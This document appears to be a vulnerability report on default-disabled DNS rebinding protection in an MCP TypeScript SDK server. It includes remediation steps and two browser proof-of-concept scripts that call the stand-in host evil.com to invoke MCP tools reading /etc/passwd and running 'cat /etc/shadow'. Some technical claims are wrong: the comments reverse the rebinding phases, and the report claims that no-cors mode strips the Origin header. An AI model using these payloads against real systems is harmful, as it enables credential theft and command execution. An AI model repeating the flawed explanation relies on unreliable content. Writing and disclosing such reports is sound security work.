# Vulnerability Report: DNS Rebinding Protection Disabled by Default (TypeScript SDK)

## Summary

| Field | Value |
|---|---|
| **Repository** | [modelcontextprotocol/typescript-sdk](https://github.com/modelcontextprotocol/typescript-sdk) |
| **Vulnerability Type** | Security Misconfiguration / DNS Rebinding (CWE-1188) |
| **CVSS v3.1 Score** | **7.5 (High)** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Affected File** | `packages/server-legacy/src/sse/sse.ts` |
| **Suggested Submission** | HackerOne — Anthropic |

---

## Vulnerability Details

### Root Cause (Two Compounding Issues)

**Issue 1 — Default disabled:**
```typescript
enableDnsReindingProtection: false  // Note: typo "Reinding" vs "Rebinding"
```

**Issue 2 — Missing Origin header bypasses all checks:**
```typescript
if (!origin) {
    return; // Skip all security checks
}
```

Even when protection is enabled, requests **without** an `Origin` header bypass all validation. The property name also contains a typo (`Reinding` instead of `Rebinding`), causing confusion.

### Source Code Evidence

```typescript
// packages/server-legacy/src/sse/sse.ts
export interface SSEServerOptions {
    enableDnsReindingProtection?: boolean;  // Typo: should be "Rebinding"
}

function validateOrigin(req: IncomingMessage): boolean {
    const origin = req.headers['origin'];
    if (!origin) return true;           // No Origin → accepted (bypass)
    if (!options.enableDnsReindingProtection) return true;  // Disabled → accepted
    return validateOriginAgainstAllowlist(origin);
}
```

### Impact
Identical to Python SDK — malicious websites can invoke arbitrary MCP tools. The Origin-header bypass makes it even more exploitable since some HTTP clients/proxies strip Origin.

---

## Proof of Concept

### Prerequisites
- Victim running MCP server (TypeScript SDK) on `localhost:3000`
- Attacker controls domain `evil.com`

### PoC — Origin Header Bypass (works even when protection enabled)

```html
<script>
async function exploit() {
    // mode: 'no-cors' strips the Origin header → bypasses validation
    await fetch('http://evil.com:3000/', {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            jsonrpc: '2.0', id: 1, method: 'tools/call',
            params: {name: 'read_file', arguments: {path: '/etc/passwd'}}
        })
    });
    document.body.innerHTML += '<p>Tool executed on victim machine.</p>';
}
exploit();
</script>
```

### PoC — Standard DNS Rebinding

```html
<script>
async function exploit() {
    // Phase 1: evil.com → 127.0.0.1
    await fetch('http://evil.com:3000/', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            jsonrpc: '2.0', id: 1, method: 'initialize',
            params: {protocolVersion: '2024-11-05', capabilities: {},
                     clientInfo: {name:'poc',version:'1.0'}}
        })
    });
    await new Promise(r => setTimeout(r, 3000));
    // Phase 2: DNS rebinds to attacker IP
    const resp = await fetch('http://evil.com:3000/', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            jsonrpc: '2.0', id: 2, method: 'tools/call',
            params: {name: 'execute_command', arguments: {command: 'cat /etc/shadow'}}
        })
    });
    document.body.innerHTML += '<pre>' + await resp.text() + '</pre>';
}
exploit();
</script>
```

---

## Remediation
1. Change default to `enableDnsRebindingProtection: true`
2. Fix the typo (`Reinding` → `Rebinding`) with deprecation path
3. Never skip validation for missing Origin headers
4. Add Host header validation

## References
- [CWE-1188](https://cwe.mitre.org/data/definitions/1188.html)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
